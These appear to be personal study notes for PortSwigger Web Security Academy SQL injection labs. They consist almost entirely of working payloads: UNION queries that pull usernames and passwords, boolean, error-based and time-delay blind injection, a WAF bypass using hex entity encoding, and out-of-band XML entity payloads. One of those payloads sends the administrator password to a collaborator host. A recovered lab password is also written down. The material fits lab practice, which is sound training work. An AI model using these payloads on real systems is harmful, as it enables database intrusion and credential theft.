'+UNION+SELECT+'abc','def'+FROM+dual--
'+UNION+SELECT+NULL,NULL,NULL-- (Input 'String' in rand NULL to find string column)
' UNION SELECT 'abc','def'# > ' UNION SELECT @@version,+null#
[SQL injection cheat sheet | Web Security Academy](https://portswigger.net/web-security/sql-injection/cheat-sheet)
```

```SELECT
table_name
column_name
```
```FROM
dual (Oracle)
all_tab_columns
all_tables
information_schema.tables
information_schema.columns
```
```WHERE
table_name='test'

```

```
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
```
```
'+UNION+SELECT+username_hzqevn,+password_sngsqc+FROM+users_qrdlhx-- 
```

```
'UNION+SELECT+table_name,+NULL+FROM+all_tables--
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_JPVMHX'--
'+UNION+SELECT+USERNAME_PFGKEQ,PASSWORD_MMPNXN+FROM+USERS_JPVMHX--
```
```
'UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='USERS_VHRNXE'--
```
	```Multi values (administrator~7vfuttftxgxaigu5ir3b)
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
``

`Blind SQL (trackingId > 'Welcome back')
'AND '1'='1 > true || 'AND '1'='2 > false
'AND (SELECT 'a' FROM users LIMIT 1)='a > true
'AND (SELECT 'a' FROM users WHERE username='administrator')='a; > true
'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a > true
'AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

`Blind SQl with condition error`
input ' > error || input '' > ok
'||(SELECT '')||' > error || '||(SELECT '' FROM dual)||' > ok
'||(SELECT '' FROM not-a-real-table)||' > error || 
'||(SELECT '' FROM users WHERE ROWNUM = 1)||' > ok
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' > error
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' > ok
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' > error
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' > ok
'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||' >> find passwords 
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' >> find 500 to verify passwords
``1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 
y6he5pmpdsblzr71ehen  

`Blind SQL with error based`
input ' > error || input '-- > ok
' AND CAST((SELECT 1) AS int)-- > error
' AND 1=CAST((SELECT 1) AS int)-- > ok
' AND CAST((SELECT username FROM users) AS int)-- > error
delect original cookie ' AND CAST((SELECT username FROM users) AS int)-- > new error
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- > find username
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- > find password

``Blind SQL with time delay
'||pg_sleep(10)-- #checktypeSQL 
``Blind SQL with time delay and information 
#ConditionalTimeDelays
'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- > slp 10 sec
'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- > slp 0 sec
'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- > slp 10 sec 
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password>1))+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- #intruderTofindLENGTHpass
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- > find password
``Blind SQL with OOB
```DNS
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

`Blind SQl with OOB (data exfiltration)
```
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

``Blind SQL with filter bypass (XML encoding)
probe input > probe the `storeId` to see whether your input is evaluated like
1+1,UNION SELECT NULL > WAF filter
		Hackvertor extension > **encode** > **dec_entities/hex_entities**
		<@hex_entities>1 UNION SELECT username||'~'||password FROM users</@hex_entities>
	แบ่ง column_name ด้วย || '~' || such as admin~password


``Order By PostgreSQL filter '
```
(CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username=$$administrator$$)=$$a$$ THEN (SELECT 1 FROM pg_sleep(5)) ELSE 1 END) --
```
filter (case)
```
, (CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username=$$administrator$$)=$$a$$ THEN (SELECT 1 FROM pg_sleep(5)) ELSE 1 END) --
```